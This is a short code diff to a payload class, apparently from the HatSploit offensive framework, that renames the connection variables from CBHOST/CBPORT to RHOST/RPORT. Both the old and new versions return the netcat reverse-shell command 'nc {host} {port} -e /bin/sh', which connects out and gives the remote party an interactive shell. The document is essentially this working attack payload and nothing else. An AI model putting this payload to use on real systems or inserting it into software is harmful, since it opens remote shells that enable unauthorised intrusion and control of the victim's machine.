@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
-        payload = f"nc {connback_host} {connback_port} -e /bin/sh"
+        payload = f"nc {remote_host} {remote_port} -e /bin/sh"
         return payload
